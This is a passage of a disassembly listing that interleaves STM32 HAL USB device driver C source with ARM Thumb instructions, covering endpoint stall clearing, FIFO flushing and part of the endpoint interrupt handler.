 80023ee:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80023f0:	687b      	ldr	r3, [r7, #4]
 80023f2:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80023f6:	2b01      	cmp	r3, #1
 80023f8:	d101      	bne.n	80023fe <HAL_PCD_EP_SetStall+0x7e>
 80023fa:	2302      	movs	r3, #2
 80023fc:	e01c      	b.n	8002438 <HAL_PCD_EP_SetStall+0xb8>
 80023fe:	687b      	ldr	r3, [r7, #4]
 8002400:	2201      	movs	r2, #1
 8002402:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  (void)USB_EPSetStall(hpcd->Instance, ep);
 8002406:	687b      	ldr	r3, [r7, #4]
 8002408:	681b      	ldr	r3, [r3, #0]
 800240a:	68f9      	ldr	r1, [r7, #12]
 800240c:	4618      	mov	r0, r3
 800240e:	f005 febb 	bl	8008188 <USB_EPSetStall>

  if ((ep_addr & EP_ADDR_MSK) == 0U)
 8002412:	78fb      	ldrb	r3, [r7, #3]
 8002414:	f003 0307 	and.w	r3, r3, #7
 8002418:	2b00      	cmp	r3, #0
 800241a:	d108      	bne.n	800242e <HAL_PCD_EP_SetStall+0xae>
  {
    (void)USB_EP0_OutStart(hpcd->Instance, (uint8_t *)hpcd->Setup);
 800241c:	687b      	ldr	r3, [r7, #4]
 800241e:	681a      	ldr	r2, [r3, #0]
 8002420:	687b      	ldr	r3, [r7, #4]
 8002422:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 8002426:	4619      	mov	r1, r3
 8002428:	4610      	mov	r0, r2
 800242a:	f005 fffc 	bl	8008426 <USB_EP0_OutStart>
  }

  __HAL_UNLOCK(hpcd);
 800242e:	687b      	ldr	r3, [r7, #4]
 8002430:	2200      	movs	r2, #0
 8002432:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002436:	2300      	movs	r3, #0
}
 8002438:	4618      	mov	r0, r3
 800243a:	3710      	adds	r7, #16
 800243c:	46bd      	mov	sp, r7
 800243e:	bd80      	pop	{r7, pc}

08002440 <HAL_PCD_EP_ClrStall>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_ClrStall(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 8002440:	b580      	push	{r7, lr}
 8002442:	b084      	sub	sp, #16
 8002444:	af00      	add	r7, sp, #0
 8002446:	6078      	str	r0, [r7, #4]
 8002448:	460b      	mov	r3, r1
 800244a:	70fb      	strb	r3, [r7, #3]
  PCD_EPTypeDef *ep;

  if (((uint32_t)ep_addr & 0x0FU) > hpcd->Init.dev_endpoints)
 800244c:	78fb      	ldrb	r3, [r7, #3]
 800244e:	f003 020f 	and.w	r2, r3, #15
 8002452:	687b      	ldr	r3, [r7, #4]
 8002454:	685b      	ldr	r3, [r3, #4]
 8002456:	429a      	cmp	r2, r3
 8002458:	d901      	bls.n	800245e <HAL_PCD_EP_ClrStall+0x1e>
  {
    return HAL_ERROR;
 800245a:	2301      	movs	r3, #1
 800245c:	e040      	b.n	80024e0 <HAL_PCD_EP_ClrStall+0xa0>
  }

  if ((0x80U & ep_addr) == 0x80U)
 800245e:	f997 3003 	ldrsb.w	r3, [r7, #3]
 8002462:	2b00      	cmp	r3, #0
 8002464:	da0e      	bge.n	8002484 <HAL_PCD_EP_ClrStall+0x44>
  {
    ep = &hpcd->IN_ep[ep_addr & EP_ADDR_MSK];
 8002466:	78fb      	ldrb	r3, [r7, #3]
 8002468:	f003 0307 	and.w	r3, r3, #7
 800246c:	1c5a      	adds	r2, r3, #1
 800246e:	4613      	mov	r3, r2
 8002470:	009b      	lsls	r3, r3, #2
 8002472:	4413      	add	r3, r2
 8002474:	00db      	lsls	r3, r3, #3
 8002476:	687a      	ldr	r2, [r7, #4]
 8002478:	4413      	add	r3, r2
 800247a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 1U;
 800247c:	68fb      	ldr	r3, [r7, #12]
 800247e:	2201      	movs	r2, #1
 8002480:	705a      	strb	r2, [r3, #1]
 8002482:	e00e      	b.n	80024a2 <HAL_PCD_EP_ClrStall+0x62>
  }
  else
  {
    ep = &hpcd->OUT_ep[ep_addr & EP_ADDR_MSK];
 8002484:	78fb      	ldrb	r3, [r7, #3]
 8002486:	f003 0207 	and.w	r2, r3, #7
 800248a:	4613      	mov	r3, r2
 800248c:	009b      	lsls	r3, r3, #2
 800248e:	4413      	add	r3, r2
 8002490:	00db      	lsls	r3, r3, #3
 8002492:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002496:	687a      	ldr	r2, [r7, #4]
 8002498:	4413      	add	r3, r2
 800249a:	60fb      	str	r3, [r7, #12]
    ep->is_in = 0U;
 800249c:	68fb      	ldr	r3, [r7, #12]
 800249e:	2200      	movs	r2, #0
 80024a0:	705a      	strb	r2, [r3, #1]
  }

  ep->is_stall = 0U;
 80024a2:	68fb      	ldr	r3, [r7, #12]
 80024a4:	2200      	movs	r2, #0
 80024a6:	709a      	strb	r2, [r3, #2]
  ep->num = ep_addr & EP_ADDR_MSK;
 80024a8:	78fb      	ldrb	r3, [r7, #3]
 80024aa:	f003 0307 	and.w	r3, r3, #7
 80024ae:	b2da      	uxtb	r2, r3
 80024b0:	68fb      	ldr	r3, [r7, #12]
 80024b2:	701a      	strb	r2, [r3, #0]

  __HAL_LOCK(hpcd);
 80024b4:	687b      	ldr	r3, [r7, #4]
 80024b6:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024ba:	2b01      	cmp	r3, #1
 80024bc:	d101      	bne.n	80024c2 <HAL_PCD_EP_ClrStall+0x82>
 80024be:	2302      	movs	r3, #2
 80024c0:	e00e      	b.n	80024e0 <HAL_PCD_EP_ClrStall+0xa0>
 80024c2:	687b      	ldr	r3, [r7, #4]
 80024c4:	2201      	movs	r2, #1
 80024c6:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8
  (void)USB_EPClearStall(hpcd->Instance, ep);
 80024ca:	687b      	ldr	r3, [r7, #4]
 80024cc:	681b      	ldr	r3, [r3, #0]
 80024ce:	68f9      	ldr	r1, [r7, #12]
 80024d0:	4618      	mov	r0, r3
 80024d2:	f005 feaa 	bl	800822a <USB_EPClearStall>
  __HAL_UNLOCK(hpcd);
 80024d6:	687b      	ldr	r3, [r7, #4]
 80024d8:	2200      	movs	r2, #0
 80024da:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 80024de:	2300      	movs	r3, #0
}
 80024e0:	4618      	mov	r0, r3
 80024e2:	3710      	adds	r7, #16
 80024e4:	46bd      	mov	sp, r7
 80024e6:	bd80      	pop	{r7, pc}

080024e8 <HAL_PCD_EP_Flush>:
  * @param  hpcd PCD handle
  * @param  ep_addr endpoint address
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_PCD_EP_Flush(PCD_HandleTypeDef *hpcd, uint8_t ep_addr)
{
 80024e8:	b580      	push	{r7, lr}
 80024ea:	b082      	sub	sp, #8
 80024ec:	af00      	add	r7, sp, #0
 80024ee:	6078      	str	r0, [r7, #4]
 80024f0:	460b      	mov	r3, r1
 80024f2:	70fb      	strb	r3, [r7, #3]
  __HAL_LOCK(hpcd);
 80024f4:	687b      	ldr	r3, [r7, #4]
 80024f6:	f893 32a8 	ldrb.w	r3, [r3, #680]	; 0x2a8
 80024fa:	2b01      	cmp	r3, #1
 80024fc:	d101      	bne.n	8002502 <HAL_PCD_EP_Flush+0x1a>
 80024fe:	2302      	movs	r3, #2
 8002500:	e01b      	b.n	800253a <HAL_PCD_EP_Flush+0x52>
 8002502:	687b      	ldr	r3, [r7, #4]
 8002504:	2201      	movs	r2, #1
 8002506:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  if ((ep_addr & 0x80U) == 0x80U)
 800250a:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800250e:	2b00      	cmp	r3, #0
 8002510:	da09      	bge.n	8002526 <HAL_PCD_EP_Flush+0x3e>
  {
    (void)USB_FlushTxFifo(hpcd->Instance, (uint32_t)ep_addr & EP_ADDR_MSK);
 8002512:	687b      	ldr	r3, [r7, #4]
 8002514:	681a      	ldr	r2, [r3, #0]
 8002516:	78fb      	ldrb	r3, [r7, #3]
 8002518:	f003 0307 	and.w	r3, r3, #7
 800251c:	4619      	mov	r1, r3
 800251e:	4610      	mov	r0, r2
 8002520:	f003 fcb8 	bl	8005e94 <USB_FlushTxFifo>
 8002524:	e004      	b.n	8002530 <HAL_PCD_EP_Flush+0x48>
  }
  else
  {
    (void)USB_FlushRxFifo(hpcd->Instance);
 8002526:	687b      	ldr	r3, [r7, #4]
 8002528:	681b      	ldr	r3, [r3, #0]
 800252a:	4618      	mov	r0, r3
 800252c:	f003 fcbe 	bl	8005eac <USB_FlushRxFifo>
  }

  __HAL_UNLOCK(hpcd);
 8002530:	687b      	ldr	r3, [r7, #4]
 8002532:	2200      	movs	r2, #0
 8002534:	f883 22a8 	strb.w	r2, [r3, #680]	; 0x2a8

  return HAL_OK;
 8002538:	2300      	movs	r3, #0
}
 800253a:	4618      	mov	r0, r3
 800253c:	3708      	adds	r7, #8
 800253e:	46bd      	mov	sp, r7
 8002540:	bd80      	pop	{r7, pc}

08002542 <PCD_EP_ISR_Handler>:
  * @brief  This function handles PCD Endpoint interrupt request.
  * @param  hpcd PCD handle
  * @retval HAL status
  */
static HAL_StatusTypeDef PCD_EP_ISR_Handler(PCD_HandleTypeDef *hpcd)
{
 8002542:	b580      	push	{r7, lr}
 8002544:	b096      	sub	sp, #88	; 0x58
 8002546:	af00      	add	r7, sp, #0
 8002548:	6078      	str	r0, [r7, #4]
#if (USE_USB_DOUBLE_BUFFER != 1U)
  count = 0U;
#endif /* USE_USB_DOUBLE_BUFFER */

  /* stay in loop while pending interrupts */
  while ((hpcd->Instance->ISTR & USB_ISTR_CTR) != 0U)
 800254a:	e3b1      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
  {
    wIstr = hpcd->Instance->ISTR;
 800254c:	687b      	ldr	r3, [r7, #4]
 800254e:	681b      	ldr	r3, [r3, #0]
 8002550:	f8b3 3044 	ldrh.w	r3, [r3, #68]	; 0x44
 8002554:	f8a7 304e 	strh.w	r3, [r7, #78]	; 0x4e

    /* extract highest priority endpoint number */
    epindex = (uint8_t)(wIstr & USB_ISTR_EP_ID);
 8002558:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 800255c:	b2db      	uxtb	r3, r3
 800255e:	f003 030f 	and.w	r3, r3, #15
 8002562:	f887 304d 	strb.w	r3, [r7, #77]	; 0x4d

    if (epindex == 0U)
 8002566:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800256a:	2b00      	cmp	r3, #0
 800256c:	f040 8173 	bne.w	8002856 <PCD_EP_ISR_Handler+0x314>
    {
      /* Decode and service control endpoint interrupt */

      /* DIR bit = origin of the interrupt */
      if ((wIstr & USB_ISTR_DIR) == 0U)
 8002570:	f8b7 304e 	ldrh.w	r3, [r7, #78]	; 0x4e
 8002574:	f003 0310 	and.w	r3, r3, #16
 8002578:	2b00      	cmp	r3, #0
 800257a:	d150      	bne.n	800261e <PCD_EP_ISR_Handler+0xdc>
      {
        /* DIR = 0 */

        /* DIR = 0 => IN  int */
        /* DIR = 0 implies that (EP_CTR_TX = 1) always */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 800257c:	687b      	ldr	r3, [r7, #4]
 800257e:	681b      	ldr	r3, [r3, #0]
 8002580:	881b      	ldrh	r3, [r3, #0]
 8002582:	b29b      	uxth	r3, r3
 8002584:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002588:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800258c:	81fb      	strh	r3, [r7, #14]
 800258e:	687b      	ldr	r3, [r7, #4]
 8002590:	681a      	ldr	r2, [r3, #0]
 8002592:	89fb      	ldrh	r3, [r7, #14]
 8002594:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002598:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800259c:	b29b      	uxth	r3, r3
 800259e:	8013      	strh	r3, [r2, #0]
        ep = &hpcd->IN_ep[0];
 80025a0:	687b      	ldr	r3, [r7, #4]
 80025a2:	3328      	adds	r3, #40	; 0x28
 80025a4:	657b      	str	r3, [r7, #84]	; 0x54

        ep->xfer_count = PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 80025a6:	687b      	ldr	r3, [r7, #4]
 80025a8:	681b      	ldr	r3, [r3, #0]
 80025aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80025ae:	b29b      	uxth	r3, r3
 80025b0:	461a      	mov	r2, r3
 80025b2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025b4:	781b      	ldrb	r3, [r3, #0]
 80025b6:	00db      	lsls	r3, r3, #3
 80025b8:	4413      	add	r3, r2
 80025ba:	687a      	ldr	r2, [r7, #4]
 80025bc:	6812      	ldr	r2, [r2, #0]
 80025be:	4413      	add	r3, r2
 80025c0:	f203 4302 	addw	r3, r3, #1026	; 0x402
 80025c4:	881b      	ldrh	r3, [r3, #0]
 80025c6:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80025ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025cc:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += ep->xfer_count;
 80025ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d0:	695a      	ldr	r2, [r3, #20]
 80025d2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025d4:	69db      	ldr	r3, [r3, #28]
 80025d6:	441a      	add	r2, r3
 80025d8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025da:	615a      	str	r2, [r3, #20]

        /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
        hpcd->DataInStageCallback(hpcd, 0U);
#else
        HAL_PCD_DataInStageCallback(hpcd, 0U);
 80025dc:	2100      	movs	r1, #0
 80025de:	6878      	ldr	r0, [r7, #4]
 80025e0:	f00a f98f 	bl	800c902 <HAL_PCD_DataInStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */

        if ((hpcd->USB_Address > 0U) && (ep->xfer_len == 0U))
 80025e4:	687b      	ldr	r3, [r7, #4]
 80025e6:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 80025ea:	b2db      	uxtb	r3, r3
 80025ec:	2b00      	cmp	r3, #0
 80025ee:	f000 835f 	beq.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
 80025f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80025f4:	699b      	ldr	r3, [r3, #24]
 80025f6:	2b00      	cmp	r3, #0
 80025f8:	f040 835a 	bne.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
        {
          hpcd->Instance->DADDR = ((uint16_t)hpcd->USB_Address | USB_DADDR_EF);
 80025fc:	687b      	ldr	r3, [r7, #4]
 80025fe:	f893 3024 	ldrb.w	r3, [r3, #36]	; 0x24
 8002602:	b2db      	uxtb	r3, r3
 8002604:	f063 037f 	orn	r3, r3, #127	; 0x7f
 8002608:	b2da      	uxtb	r2, r3
 800260a:	687b      	ldr	r3, [r7, #4]
 800260c:	681b      	ldr	r3, [r3, #0]
 800260e:	b292      	uxth	r2, r2
 8002610:	f8a3 204c 	strh.w	r2, [r3, #76]	; 0x4c
          hpcd->USB_Address = 0U;
 8002614:	687b      	ldr	r3, [r7, #4]
 8002616:	2200      	movs	r2, #0
 8002618:	f883 2024 	strb.w	r2, [r3, #36]	; 0x24
 800261c:	e348      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
      {
        /* DIR = 1 */

        /* DIR = 1 & CTR_RX => SETUP or OUT int */
        /* DIR = 1 & (CTR_TX | CTR_RX) => 2 int pending */
        ep = &hpcd->OUT_ep[0];
 800261e:	687b      	ldr	r3, [r7, #4]
 8002620:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002624:	657b      	str	r3, [r7, #84]	; 0x54
        wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 8002626:	687b      	ldr	r3, [r7, #4]
 8002628:	681b      	ldr	r3, [r3, #0]
 800262a:	881b      	ldrh	r3, [r3, #0]
 800262c:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

        if ((wEPVal & USB_EP_SETUP) != 0U)
 8002630:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002634:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002638:	2b00      	cmp	r3, #0
 800263a:	d032      	beq.n	80026a2 <PCD_EP_ISR_Handler+0x160>
        {
          /* Get SETUP Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 800263c:	687b      	ldr	r3, [r7, #4]
 800263e:	681b      	ldr	r3, [r3, #0]
 8002640:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002644:	b29b      	uxth	r3, r3
 8002646:	461a      	mov	r2, r3
 8002648:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800264a:	781b      	ldrb	r3, [r3, #0]
 800264c:	00db      	lsls	r3, r3, #3
 800264e:	4413      	add	r3, r2
 8002650:	687a      	ldr	r2, [r7, #4]
 8002652:	6812      	ldr	r2, [r2, #0]
 8002654:	4413      	add	r3, r2
 8002656:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800265a:	881b      	ldrh	r3, [r3, #0]
 800265c:	f3c3 0209 	ubfx	r2, r3, #0, #10
 8002660:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002662:	61da      	str	r2, [r3, #28]

          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002664:	687b      	ldr	r3, [r7, #4]
 8002666:	6818      	ldr	r0, [r3, #0]
 8002668:	687b      	ldr	r3, [r7, #4]
 800266a:	f503 712c 	add.w	r1, r3, #688	; 0x2b0
 800266e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002670:	88da      	ldrh	r2, [r3, #6]
                      ep->pmaadress, (uint16_t)ep->xfer_count);
 8002672:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002674:	69db      	ldr	r3, [r3, #28]
          USB_ReadPMA(hpcd->Instance, (uint8_t *)hpcd->Setup,
 8002676:	b29b      	uxth	r3, r3
 8002678:	f005 ff23 	bl	80084c2 <USB_ReadPMA>

          /* SETUP bit kept frozen while CTR_RX = 1 */
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 800267c:	687b      	ldr	r3, [r7, #4]
 800267e:	681b      	ldr	r3, [r3, #0]
 8002680:	881b      	ldrh	r3, [r3, #0]
 8002682:	b29a      	uxth	r2, r3
 8002684:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002688:	4013      	ands	r3, r2
 800268a:	823b      	strh	r3, [r7, #16]
 800268c:	687b      	ldr	r3, [r7, #4]
 800268e:	681b      	ldr	r3, [r3, #0]
 8002690:	8a3a      	ldrh	r2, [r7, #16]
 8002692:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002696:	b292      	uxth	r2, r2
 8002698:	801a      	strh	r2, [r3, #0]

          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 800269a:	6878      	ldr	r0, [r7, #4]
 800269c:	f00a f904 	bl	800c8a8 <HAL_PCD_SetupStageCallback>
 80026a0:	e306      	b.n	8002cb0 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 80026a2:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 80026a6:	2b00      	cmp	r3, #0
 80026a8:	f280 8302 	bge.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 80026ac:	687b      	ldr	r3, [r7, #4]
 80026ae:	681b      	ldr	r3, [r3, #0]
 80026b0:	881b      	ldrh	r3, [r3, #0]
 80026b2:	b29a      	uxth	r2, r3
 80026b4:	f640 738f 	movw	r3, #3983	; 0xf8f
 80026b8:	4013      	ands	r3, r2
 80026ba:	83fb      	strh	r3, [r7, #30]
 80026bc:	687b      	ldr	r3, [r7, #4]
 80026be:	681b      	ldr	r3, [r3, #0]
 80026c0:	8bfa      	ldrh	r2, [r7, #30]
 80026c2:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80026c6:	b292      	uxth	r2, r2
 80026c8:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80026ca:	687b      	ldr	r3, [r7, #4]
 80026cc:	681b      	ldr	r3, [r3, #0]
 80026ce:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80026d2:	b29b      	uxth	r3, r3
 80026d4:	461a      	mov	r2, r3
 80026d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026d8:	781b      	ldrb	r3, [r3, #0]
 80026da:	00db      	lsls	r3, r3, #3
 80026dc:	4413      	add	r3, r2
 80026de:	687a      	ldr	r2, [r7, #4]
 80026e0:	6812      	ldr	r2, [r2, #0]
 80026e2:	4413      	add	r3, r2
 80026e4:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80026e8:	881b      	ldrh	r3, [r3, #0]
 80026ea:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80026ee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f0:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80026f2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026f4:	69db      	ldr	r3, [r3, #28]
 80026f6:	2b00      	cmp	r3, #0
 80026f8:	d019      	beq.n	800272e <PCD_EP_ISR_Handler+0x1ec>
 80026fa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80026fc:	695b      	ldr	r3, [r3, #20]
 80026fe:	2b00      	cmp	r3, #0
 8002700:	d015      	beq.n	800272e <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002702:	687b      	ldr	r3, [r7, #4]
 8002704:	6818      	ldr	r0, [r3, #0]
 8002706:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002708:	6959      	ldr	r1, [r3, #20]
 800270a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800270c:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 800270e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002710:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 8002712:	b29b      	uxth	r3, r3
 8002714:	f005 fed5 	bl	80084c2 <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 8002718:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800271a:	695a      	ldr	r2, [r3, #20]
 800271c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800271e:	69db      	ldr	r3, [r3, #28]
 8002720:	441a      	add	r2, r3
 8002722:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002724:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 8002726:	2100      	movs	r1, #0
 8002728:	6878      	ldr	r0, [r7, #4]
 800272a:	f00a f8cf 	bl	800c8cc <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800272e:	687b      	ldr	r3, [r7, #4]
 8002730:	681b      	ldr	r3, [r3, #0]
 8002732:	881b      	ldrh	r3, [r3, #0]
 8002734:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002738:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800273c:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8002740:	2b00      	cmp	r3, #0
 8002742:	f040 82b5 	bne.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
 8002746:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 800274a:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 800274e:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 8002752:	f000 82ad 	beq.w	8002cb0 <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 8002756:	687b      	ldr	r3, [r7, #4]
 8002758:	681b      	ldr	r3, [r3, #0]
 800275a:	61bb      	str	r3, [r7, #24]
 800275c:	687b      	ldr	r3, [r7, #4]
 800275e:	681b      	ldr	r3, [r3, #0]
 8002760:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002764:	b29b      	uxth	r3, r3
 8002766:	461a      	mov	r2, r3
 8002768:	69bb      	ldr	r3, [r7, #24]
 800276a:	4413      	add	r3, r2
 800276c:	61bb      	str	r3, [r7, #24]
 800276e:	69bb      	ldr	r3, [r7, #24]
 8002770:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002774:	617b      	str	r3, [r7, #20]
 8002776:	697b      	ldr	r3, [r7, #20]
 8002778:	881b      	ldrh	r3, [r3, #0]
 800277a:	b29b      	uxth	r3, r3
 800277c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002780:	b29a      	uxth	r2, r3
 8002782:	697b      	ldr	r3, [r7, #20]
 8002784:	801a      	strh	r2, [r3, #0]
 8002786:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002788:	691b      	ldr	r3, [r3, #16]
 800278a:	2b3e      	cmp	r3, #62	; 0x3e
 800278c:	d91d      	bls.n	80027ca <PCD_EP_ISR_Handler+0x288>
 800278e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002790:	691b      	ldr	r3, [r3, #16]
 8002792:	095b      	lsrs	r3, r3, #5
 8002794:	647b      	str	r3, [r7, #68]	; 0x44
 8002796:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002798:	691b      	ldr	r3, [r3, #16]
 800279a:	f003 031f 	and.w	r3, r3, #31
 800279e:	2b00      	cmp	r3, #0
 80027a0:	d102      	bne.n	80027a8 <PCD_EP_ISR_Handler+0x266>
 80027a2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027a4:	3b01      	subs	r3, #1
 80027a6:	647b      	str	r3, [r7, #68]	; 0x44
 80027a8:	697b      	ldr	r3, [r7, #20]
 80027aa:	881b      	ldrh	r3, [r3, #0]
 80027ac:	b29a      	uxth	r2, r3
 80027ae:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027b0:	b29b      	uxth	r3, r3
 80027b2:	029b      	lsls	r3, r3, #10
 80027b4:	b29b      	uxth	r3, r3
 80027b6:	4313      	orrs	r3, r2
 80027b8:	b29b      	uxth	r3, r3
 80027ba:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027be:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027c2:	b29a      	uxth	r2, r3
 80027c4:	697b      	ldr	r3, [r7, #20]
 80027c6:	801a      	strh	r2, [r3, #0]
 80027c8:	e026      	b.n	8002818 <PCD_EP_ISR_Handler+0x2d6>
 80027ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027cc:	691b      	ldr	r3, [r3, #16]
 80027ce:	2b00      	cmp	r3, #0
 80027d0:	d10a      	bne.n	80027e8 <PCD_EP_ISR_Handler+0x2a6>
 80027d2:	697b      	ldr	r3, [r7, #20]
 80027d4:	881b      	ldrh	r3, [r3, #0]
 80027d6:	b29b      	uxth	r3, r3
 80027d8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80027dc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80027e0:	b29a      	uxth	r2, r3
 80027e2:	697b      	ldr	r3, [r7, #20]
 80027e4:	801a      	strh	r2, [r3, #0]
 80027e6:	e017      	b.n	8002818 <PCD_EP_ISR_Handler+0x2d6>
 80027e8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027ea:	691b      	ldr	r3, [r3, #16]
 80027ec:	085b      	lsrs	r3, r3, #1
 80027ee:	647b      	str	r3, [r7, #68]	; 0x44
 80027f0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80027f2:	691b      	ldr	r3, [r3, #16]
 80027f4:	f003 0301 	and.w	r3, r3, #1
 80027f8:	2b00      	cmp	r3, #0
 80027fa:	d002      	beq.n	8002802 <PCD_EP_ISR_Handler+0x2c0>
 80027fc:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80027fe:	3301      	adds	r3, #1
 8002800:	647b      	str	r3, [r7, #68]	; 0x44
 8002802:	697b      	ldr	r3, [r7, #20]
 8002804:	881b      	ldrh	r3, [r3, #0]
 8002806:	b29a      	uxth	r2, r3
 8002808:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800280a:	b29b      	uxth	r3, r3
 800280c:	029b      	lsls	r3, r3, #10
